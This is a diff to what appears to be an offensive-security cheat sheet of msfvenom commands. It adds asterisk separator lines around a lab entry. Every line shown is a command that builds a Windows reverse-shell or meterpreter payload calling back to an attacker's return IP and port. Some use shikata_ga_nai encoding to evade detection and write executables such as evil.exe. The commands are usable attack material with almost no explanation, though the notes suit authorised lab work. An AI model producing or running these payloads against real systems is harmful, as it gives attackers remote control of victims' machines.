@@ -20,8 +20,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<RETURN_IP> LPORT=<RETURN_PORT
 Windows Reverse TCP Shell
 msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
 
+*******************************************************************************************************************************
 #1  ==========    From labs    (32 bit <TARGET> ) ==========
 #> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=<RETURN_IP> LPORT=<RETRUN_PORT> > evil.exe
+*******************************************************************************************************************************
 
 #2  ==========    Windows Shellcode with SHIKATA-GA-NAI  (32 bit <TARGET> )  ==========
 #> msfvenom -p windows/shell/reverse_tcp LHOST=<RETURN_IP> LPORT=<RETURN_PORT> -f c -e x86/shikata_ga_nai -b "\x00" > test.exe
